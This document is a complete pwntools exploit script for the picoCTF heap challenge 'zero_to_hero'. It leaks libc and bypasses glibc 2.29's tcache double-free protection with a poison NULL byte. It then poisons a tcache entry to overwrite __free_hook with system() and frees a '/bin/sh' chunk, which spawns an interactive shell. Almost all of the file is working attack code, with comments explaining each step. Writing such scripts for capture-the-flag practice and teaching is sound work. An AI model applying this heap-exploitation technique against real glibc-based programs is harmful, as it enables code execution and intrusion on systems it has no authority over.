#!/usr/bin/env python3

from pwn import *

exe = ELF("./zero_to_hero_patched")
libc = ELF("./libc-chall.so", checksec = False)
ld = ELF("./ld-2.29.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 10089)

    return r


def add_superpower(size: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.sendafter(b"description: ", data)


def remove_superpower(index: int):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(index).encode("ascii"))


# We need to bypass libc 2.29's tcache double free protection using a poison NULL byte in order to perform a double free attack.
def main():
    r = conn()

    r.sendlineafter(b"hero?", b"y")
    r.recvuntil(b"Take this: ")

    libc.address = int(r.recvline(), 16) - libc.sym.system
    log.info(f"libc @ {hex(libc.address)}")

    add_superpower(0x118, b"AAAAAAAA")
    add_superpower(0x118, b"BBBBBBBB")
    
    # [0] -> [1]
    remove_superpower(1)
    remove_superpower(0)

    # Overwrite size of next chunk. Now we have the same chunk on two different bins!
    # This because tcache will store the second chunk inside of the linked list of freed chunks
    # of size 0x100 because that's what the chunk says its size is.
    add_superpower(0x118, b"A" * 0x118)
    remove_superpower(1)

    # Overwrite fd pointer so that it points to `__free_hook`, using the same chunk in the other tcache bin
    add_superpower(0xf8, p64(libc.sym.__free_hook))

    # Allocate another chunk and then allocate the fake chunk which points to `__free_hook`.
    # With this second chunk we can overwrite the hook with `system()`
    add_superpower(0x118, b"CCCCCCCC")
    add_superpower(0x118, p64(libc.sym.system))

    # Now we can allocate another chunk storing the command to pass to system and free it
    add_superpower(0x118, b"/bin/sh\x00")
    remove_superpower(6)

    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
